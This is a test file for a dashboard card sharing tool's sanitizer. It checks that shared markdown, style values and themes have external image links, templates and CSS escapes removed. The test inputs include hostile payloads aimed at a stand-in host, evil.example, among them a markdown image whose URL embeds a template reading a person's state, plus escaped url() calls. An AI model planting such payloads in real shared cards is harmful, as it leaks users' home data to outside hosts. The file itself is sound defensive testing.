import { describe, expect, it } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { cardKeyLists } from '../src/editor/transfer-loader';
import { createShareKit } from '../src/share-kit/chunk';
import { shareKitHelpers } from '../src/transfer/share-kit-loader';
import { readTheme } from '../src/transfer/kinds/theme';

const kit = createShareKit(shareKitHelpers);
const lists = cardKeyLists();
const card = (rest: Record<string, unknown>) => ({ type: 'custom:magic-card', ...rest });
const md = (content: string) => kit.readCard(0, card({ rows: [{ id: 'r', columns: [{ id: 'c', modules: [{ id: 'm', type: 'markdown', content }] }] }] }), lists);
const contentOf = (r: ReturnType<typeof md>): string => (r.ok ? (r.data.rows[0].columns[0].modules[0] as unknown as { content: string }).content : '');

describe('markdown pictures: one exact form (security 45 R-1, R-2)', () => {
  it.each([
    '<img alt=" src=/local/a.png " src=https://evil.example/p.png>',
    '<img src="/&#47evil.example/da.png">',
    '<img src="/local/a.png" onerror="x">',
    '<img src=/local/a.png>',
    '<img src="/local/a.png" src="https://evil.example/p.png">',
    '<im<img src="https://evil.example/p.png">',
    '![a](/&#47evil.example/da.png)',
    '![a][r]\n\n[r]: /&#47evil.example/da.png',
  ])('removes %j and lists it', (c) => {
    const r = md(`Hi ${c} end`);
    expect(contentOf(r)).not.toMatch(/evil|&#47/);
    expect(r.notes.some((n) => n.code === 'dropped_value')).toBe(true);
  });
  it('keeps the exact local and data forms', () => {
    const c = 'A <img src="/local/a.png"> B <img src="data:image/png;base64,AAAA" alt="a cat"> C ![x](/local/b.png)';
    const r = md(c);
    expect(contentOf(r)).toBe(c);
    expect(r.notes).toEqual([]);
  });
});

describe('templates in shared markdown (security 45 R-4)', () => {
  it('removes each template and lists it', () => {
    const r = md("{{ '!' }}[a](https://evil.example/ex.png?d={{ states('person.a') }}) {% if x %}y{% endif %} {# n #} end");
    const text = contentOf(r);
    expect(text).not.toMatch(/\{\{|\{%|\{#/);
    expect(text).not.toMatch(/evil\.example.*\{/);
    expect(r.notes.filter((n) => n.code === 'dropped_value' && n.message.includes('{'))).toHaveLength(5);
  });
  it('cannot be rebuilt by nesting or left open', () => {
    expect(contentOf(md('{{{# x #}{ 1 }}'))).not.toMatch(/\{\{|\{%|\{#/);
    expect(contentOf(md('a {{ never closed'))).toBe('a ');
  });
  it('leaves templates of a text module alone', () => {
    const r = kit.readCard(0, card({ rows: [{ id: 'r', columns: [{ id: 'c', modules: [{ id: 'm', type: 'text', text: "{{ states('sensor.a') }}" }] }] }] }), lists);
    expect(r.ok && (r.data.rows[0].columns[0].modules[0] as unknown as { text: string }).text).toBe("{{ states('sensor.a') }}");
  });
});

describe('template markers and CSS escapes (security 45 R-3)', () => {
  it('does not skip the checks for a card style key holding a template', () => {
    const r = kit.readCard(0, card({ box_shadow: String.raw`none {{ 1 }}; background:\75rl(\2f\2f evil.example/an.png)` }), lists);
    expect(JSON.stringify(r.ok ? r.data : {})).not.toMatch(/evil/);
    expect(r.ok === false || r.notes.some((n) => n.code === 'dropped_value')).toBe(true);
  });
  it('reads escapes in an untyped value', () => {
    const r = kit.readCard(0, card({ margin: String.raw`x \75rl(//evil.example/a.png)` }), lists);
    expect(JSON.stringify(r.ok ? r.data : {})).not.toMatch(/evil/);
    expect(r.ok ? r.notes.find((n) => n.code === 'dropped_value')?.hosts : ['evil.example']).toEqual(['evil.example']);
  });
});

describe('theme: a plain external address lists its host (review 46 R-5)', () => {
  it.each(['https://evil.example/x.png', '//evil.example/x.png'])('names the host of %s', (v) => {
    const r = readTheme(0, { 'primary-color': '#fff', 'ha-card-background': v }, kit);
    const n = r.notes.find((x) => x.code === 'dropped_value');
    expect(n?.hosts).toEqual(['evil.example']);
    expect(n?.message).toContain('evil.example');
  });
});

describe('source files are text (review 46 R-1)', () => {
  const walk = (d: string): string[] => readdirSync(d).flatMap((f) => (statSync(join(d, f)).isDirectory() ? walk(join(d, f)) : [join(d, f)]));
  it('has no NUL byte under src', () => {
    const bad = walk('src').filter((f) => /\.(ts|json|css)$/.test(f) && readFileSync(f).includes(0));
    expect(bad).toEqual([]);
  });
  it('writes the tick of a pressed button as CSS escape text', () => {
    for (const f of ['src/share-kit/anim-preview.ts', 'src/theme-editor/preview.ts']) expect(readFileSync(f, 'utf8')).toContain(String.raw`content: '\\2713\\00a0'`);
  });
});
